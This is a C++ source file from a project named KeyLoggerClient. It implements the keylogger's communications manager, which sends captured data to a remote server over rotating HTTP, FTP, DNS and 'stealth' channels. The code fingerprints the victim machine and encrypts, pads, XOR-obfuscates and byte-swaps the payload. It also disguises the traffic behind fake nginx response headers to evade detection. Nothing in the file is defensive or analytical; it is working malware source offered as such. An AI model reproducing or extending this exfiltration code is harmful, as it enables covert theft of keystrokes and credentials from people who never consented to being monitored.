// KeyLoggerClient/src/communication/CommsManager.cpp

#include "communication/CommsManager.h"
#include "communication/HttpComms.h"
#include "communication/FtpComms.h"
#include "communication/DnsComms.h"
#include "security/StealthComms.h"
#include "core/Logger.h"
#include "core/Configuration.h"
#include "security/Obfuscation.h"
#include "security/Encryption.h"
#include "utils/NetworkUtils.h"
#include "utils/DataUtils.h"
#include "utils/SystemUtils.h"
#include "utils/TimeUtils.h"
#include <memory>
#include <algorithm>
#include <vector>
#include <cstdint>
#include <string>

// Obfuscated strings
constexpr auto OBF_COMMS_MANAGER = OBFUSCATE("CommsManager");

CommsManager::CommsManager(Configuration* config)
    : m_config(config), m_currentMethod(nullptr) {
    InitializeCommsMethods();
}

CommsManager::~CommsManager() {
    Shutdown();
}

void CommsManager::InitializeCommsMethods() {
    // Register available communication methods
    m_commsMethods[OBFUSCATE("http")] = std::make_unique<HttpComms>(m_config);
    m_commsMethods[OBFUSCATE("https")] = std::make_unique<HttpComms>(m_config);
    m_commsMethods[OBFUSCATE("ftp")] = std::make_unique<FtpComms>(m_config);
    m_commsMethods[OBFUSCATE("dns")] = std::make_unique<DnsComms>(m_config);
    m_commsMethods[OBFUSCATE("stealth")] = std::make_unique<StealthComms>(m_config);
    
    LOG_DEBUG("Initialized " + std::to_string(m_commsMethods.size()) + 
              " communication methods");
}

bool CommsManager::Initialize() {
    std::string method;
    
    // Use stealth communication if enabled
    if (m_config->GetStealthEnabled()) {
        method = "stealth";
        LOG_INFO("Stealth communication enabled");
    } else {
        method = m_config->GetCommsMethod();
    }
    
    // Determine which server URL to use based on network mode
    std::string networkMode = m_config->GetNetworkMode();
    std::string effectiveUrl;
    
    if (networkMode == "same_wifi") {
        effectiveUrl = m_config->GetSameWifiServerUrl();
    } else if (networkMode == "different_wifi") {
        effectiveUrl = m_config->GetDifferentWifiServerUrl();
    } else { // auto detection
        if (NetworkUtils::IsOnLocalNetwork()) {
            effectiveUrl = m_config->GetSameWifiServerUrl();
        } else {
            effectiveUrl = m_config->GetDifferentWifiServerUrl();
        }
    }
    
    // Temporarily override the server URL for this connection
    m_config->SetValue("server_url", effectiveUrl);
    
    auto it = m_commsMethods.find(method);
    
    if (it == m_commsMethods.end()) {
        LOG_ERROR("Unknown communication method: " + method);
        return false;
    }

    m_currentMethod = it->second.get();
    
    if (m_currentMethod->Initialize()) {
        LOG_INFO("Communication method initialized: " + method);
        return true;
    }

    LOG_ERROR("Failed to initialize communication method: " + method);
    return TryFallbackMethods(method);
}

bool CommsManager::TryFallbackMethods(const std::string& failedMethod) {
    LOG_INFO("Attempting fallback communication methods");
    
    for (const auto& [method, comms] : m_commsMethods) {
        if (method != failedMethod) {
            LOG_INFO("Trying fallback method: " + method);
            if (comms->Initialize()) {
                m_currentMethod = comms.get();
                LOG_INFO("Fallback communication initialized with method: " + method);
                return true;
            }
        }
    }
    
    LOG_ERROR("All communication methods failed to initialize");
    return false;
}

bool CommsManager::TransmitData(const std::vector<uint8_t>& data) {
    if (!m_currentMethod) {
        LOG_ERROR("No communication method selected for transmission");
        return false;
    }

    // Apply multiple security layers
    std::vector<uint8_t> securedData = ApplySecurityLayers(data);
    
    bool success = m_currentMethod->SendData(securedData);
    
    if (!success) {
        LOG_WARN("Primary transmission failed, attempting rotation");
        RotateCommsMethod();
        success = m_currentMethod->SendData(securedData);
    }

    return success;
}

std::vector<uint8_t> CommsManager::ApplySecurityLayers(const std::vector<uint8_t>& data) {
    std::vector<uint8_t> securedData = data;
    
    // Step 1: Add metadata
    securedData = AddMetadata(securedData);

    // Step 2: Encrypt data
    std::string encryptionKey = m_config->GetEncryptionKey();
    securedData = security::Encryption::EncryptAES(securedData, encryptionKey);

    // Step 3: Add random padding
    utils::DataUtils::AddRandomPadding(securedData, 16, 256);
    
    // Step 4: Add integrity check
    AddIntegrityCheck(securedData);
    
    // Step 5: Obfuscate data
    securedData = ObfuscateData(securedData);
    
    // Step 6: Add stealth headers
    AddStealthHeaders(securedData);
    
    return securedData;
}

std::vector<uint8_t> CommsManager::AddMetadata(const std::vector<uint8_t>& data) {
    // Create metadata
    std::string metadata = "METADATA_START\n";
    metadata += "client_id:" + utils::SystemUtils::GetSystemFingerprint() + "\n";
    metadata += "timestamp:" + utils::TimeUtils::GetCurrentTimestamp() + "\n";
    metadata += "total_size:" + std::to_string(data.size()) + "\n";
    metadata += "file_count:1\n";
    metadata += "METADATA_END\n";
    
    // Combine metadata and data
    std::vector<uint8_t> enhancedData(metadata.begin(), metadata.end());
    enhancedData.insert(enhancedData.end(), data.begin(), data.end());
    
    return enhancedData;
}

void CommsManager::AddIntegrityCheck(std::vector<uint8_t>& data) {
    // Calculate checksum
    std::string checksum = security::Encryption::GenerateSHA256(
        std::string(data.begin(), data.end())
    );
    
    // Add checksum to the beginning of data
    std::string checksumHeader = "CHECKSUM:" + checksum + "\n";
    data.insert(data.begin(), checksumHeader.begin(), checksumHeader.end());
}

std::vector<uint8_t> CommsManager::ObfuscateData(const std::vector<uint8_t>& data) {
    // Use multiple obfuscation techniques
    std::vector<uint8_t> obfuscated = data;
    
    // Technique 1: XOR with rotating key
    const std::string xorKey = m_config->GetEncryptionKey();
    size_t keyIndex = 0;
    for (auto& byte : obfuscated) {
        byte ^= xorKey[keyIndex];
        keyIndex = (keyIndex + 1) % xorKey.length();
    }
    
    // Technique 2: Byte swapping
    for (size_t i = 0; i < obfuscated.size() - 1; i += 2) {
        std::swap(obfuscated[i], obfuscated[i + 1]);
    }
    
    return obfuscated;
}

void CommsManager::AddStealthHeaders(std::vector<uint8_t>& data) {
    // Add headers that make traffic look legitimate
    std::string headers = "HTTP/1.1 200 OK\r\n";
    headers += "Content-Type: application/octet-stream\r\n";
    headers += "Content-Length: " + std::to_string(data.size()) + "\r\n";
    headers += "Connection: keep-alive\r\n";
    headers += "Server: nginx/1.18.0\r\n";
    headers += "Date: " + utils::TimeUtils::GetCurrentTimestamp() + "\r\n";
    headers += "\r\n";
    
    data.insert(data.begin(), headers.begin(), headers.end());
}

void CommsManager::RotateCommsMethod() {
    LOG_INFO("Rotating communication method");
    
    // Find next method in rotation
    auto it = m_commsMethods.find(m_config->GetCommsMethod());
    if (it == m_commsMethods.end()) {
        it = m_commsMethods.begin();
    } else {
        ++it;
        if (it == m_commsMethods.end()) {
            it = m_commsMethods.begin();
        }
    }

    m_config->SetValue("comms_method", it->first);
    m_currentMethod = it->second.get();
    
    LOG_INFO("Communication method rotated to: " + it->first);
}

void CommsManager::Shutdown() {
    if (m_currentMethod) {
        m_currentMethod->Cleanup();
    }
    LOG_INFO("Communication manager shut down");
}

bool CommsManager::TestConnection() const {
    if (!m_currentMethod) return false;
    return m_currentMethod->TestConnection();
}
